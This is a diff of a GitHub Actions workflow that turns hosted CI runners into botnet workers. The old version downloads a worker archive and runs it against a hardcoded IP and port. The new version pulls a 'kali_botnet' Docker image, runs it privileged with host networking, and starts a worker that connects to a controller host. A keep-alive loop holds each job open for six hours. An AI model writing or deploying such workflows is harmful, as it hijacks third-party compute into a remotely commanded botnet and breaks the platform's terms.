@@ -1,43 +1,75 @@
-name: Worker Node
+name: Run Bot (v4b)
 
 on:
   workflow_dispatch:
 
 jobs:
-  run-worker:
+  run-bot:
     runs-on: ubuntu-latest
-    timeout-minutes: 180   # 3 hours
+    timeout-minutes: 360   # 6 hours max
+
+    env:
+      DOCKERHUB_USERNAME: ${{ secrets.DOCKERHUB_USERNAME }}
+      DOCKERHUB_PASSWORD: ${{ secrets.DOCKERHUB_PASSWORD }}
+      CONTROLLER_HOST: ${{ secrets.CONTROLLER_HOST }}
+      CONTROLLER_PORT: ${{ secrets.CONTROLLER_PORT }}
 
     steps:
-    - name: Check out repo
-      uses: actions/checkout@v3
 
-    - name: Install system dependencies
-      run: |
-        sudo apt-get update -y
-        sudo apt-get install -y python3 python3-pip unzip
+      - name: Checkout Repo
+        uses: actions/checkout@v3
 
-    - name: Install Python libraries globally
-      run: |
-        pip3 install gdown --quiet
+      - name: Login to Docker Hub
+        run: |
+          set -x
+          echo "$DOCKERHUB_PASSWORD" | docker login -u "$DOCKERHUB_USERNAME" --password-stdin
 
-    - name: Download worker archive
-      env:
-        FILE_ID: ${{ secrets.WORKER_FILE_ID }}
-      run: |
-        gdown --id "$FILE_ID" -O worker.zip
+      - name: Pull Bot Image (v4b)
+        run: |
+          set -x
+          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4b
+          docker pull $IMAGE_NAME
 
-    - name: Unzip worker archive
-      run: |
-        mkdir -p worker_dir
-        unzip -o worker.zip -d worker_dir
+      - name: Remove Old Bot Container
+        run: |
+          set -x
+          docker rm -f kali_bot || true
 
-    - name: Install worker-specific Python deps
-      working-directory: worker_dir
-      run: |
-        pip3 install aiohttp psutil aiohttp-socks --quiet
+      - name: Run Bot Container
+        run: |
+          set -x
+          IMAGE_NAME=${DOCKERHUB_USERNAME}/kali_botnet:v4b
+          docker run -d --name=kali_bot \
+            --privileged \
+            --network=host \
+            -e CONTROLLER_HOST=$CONTROLLER_HOST \
+            -e CONTROLLER_PORT=$CONTROLLER_PORT \
+            $IMAGE_NAME \
+            tail -f /dev/null
+          sleep 5
+          docker ps -a
 
-    - name: Run worker
-      working-directory: worker_dir
-      run: |
-        sudo python3 worker/worker.py --host 147.185.221.212 --port 2472
+      - name: Start Worker Process
+        run: |
+          set -x
+          docker exec kali_bot tmux new -d -s bot "python3 /app/botnet_version4/worker/worker.py --host $CONTROLLER_HOST --port $CONTROLLER_PORT"
+          docker exec kali_bot tmux ls
+
+      - name: Keep Workflow Alive (No Auto-Restart)
+        run: |
+          set -e
+          start_time=$(date +%s)
+          max_runtime=$((6 * 3600)) # 6 hours only
+
+          while true; do
+            now=$(date +%s)
+            uptime=$((now - start_time))
+            echo "[INFO] Active for $((uptime/60)) minutes"
+
+            if [ "$uptime" -ge "$max_runtime" ]; then
+              echo "[INFO] Max runtime reached. Job ending naturally."
+              exit 0
+            fi
+
+            sleep 60
+          done
